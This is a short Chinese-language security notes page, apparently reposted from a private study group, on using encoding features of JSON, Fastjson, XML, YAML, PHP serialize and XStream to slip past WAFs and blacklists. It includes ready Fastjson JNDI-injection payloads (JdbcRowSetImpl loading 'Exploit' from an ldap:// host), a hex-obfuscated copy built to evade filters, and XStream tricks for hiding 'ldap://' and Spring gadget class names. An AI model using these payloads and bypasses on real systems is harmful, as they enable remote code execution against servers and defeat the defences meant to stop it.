# 来自p师傅的知识星球
>抽空整理了一下各种序列化方式中支持的一些编码方式，我们可以在遇到一些限制、WAF的时候使用这些编码进行绕过。

### JSON：
json是最常用到的序列化方法，json中支持使用unicode编码，目标解析的时候会自动解码，
比如：`{"name": "\u0023vulhub\u0023", "age": 12}`

### Fastjson：
把Fastjson单独拎出来，因为这货除了漏洞多，即使没漏洞的最新版本，他内部存在很多奇葩的非标准操作。
比如，fastjson支持16进制编码：`{"name": "\x23vulhub\x23", "age": 12}`，这在标准的json中是不会被解析的；他还支持在json中插入注释，
比如`{"name": /*evil*/"vulhub", "age": 12}`，标准中也不支持，Jackson中可以通过开启一个选项支持这个语法；他还支持使用单引号替代双引号，
比如`{"name": 'vulhub', "age": 12}`；另外fastjson支持的各种非标准feature太多，不一一写出来了。利用这些非标准的特性，可以用来绕过很多语义化的WAF。

### XML：
xml默认支持16进制和10进制的HTML实体编码，
如`<root><name>&井35;vulhub&井x23;</name></root>`，也支持英文单词形式的实体，如`&amp;`。

### YAML：
yaml的双引号中可以使用16进制编码和unicode编码，
如`name: "\x23vulhub\u0023"`，单引号内不支持编码。

### php serialize：php的反序列化中，可以用一种长得像8进制编码，实际上是16进制编码的方式表示字符串，
具体可以参考我在星球分享过的帖子：https://t.zsxq.com/3faIYzN

```
{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://IP:7777/Exploit","autoCommit":true}}}

{"name":{"\x40\x74\x79\x70\x65":"java.lang.Class","val":"\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c"},"x":{"\x40\x74\x79\x70\x65":"\x63\x6f\x6d\x2e\x73\x75\x6e\x2e\x72\x6f\x77\x73\x65\x74\x2e\x4a\x64\x62\x63\x52\x6f\x77\x53\x65\x74\x49\x6d\x70\x6c","dataSourceName":"ldap://xxx.xxx.xxx.xxxs:1389/Exploit","\x61\x75\x74\x6f\x43\x6f\x6d\x6d\x69\x74":true}}

```
2021/10/7更新
### XStream
```xml
1. 16进制绕过

<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
当前黑名单为org[.]springframework，此时的绕过方法可以为
<org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
</org.s_.0070ringframework.aop.support.AbstractBeanFactoryPointcutAdvisor>

2. 针对标签属性内容的绕过

<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization="custom">
</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
此时的黑名单为custom，那么绕过方法可以为

<org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor serialization="cust&#111;m">
</org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor>
原理为读取属性内容时，会做符合要求的转化

3. 针对标签内容的绕过
<test>
ldap://xxxxx
</test>
此时的黑名单为ldap://，可以用如下的几种方法绕过

html编码:
这部分在提取数据时，同样对html编码的内容做了转化
<test>
&#108;dap://xxxxx
</test>

注释的方法:
在处理实际的标签内容时，遇到注视内容将被忽略掉
<test>
ld<!-- test -->ap://xxxxx
</test>


```
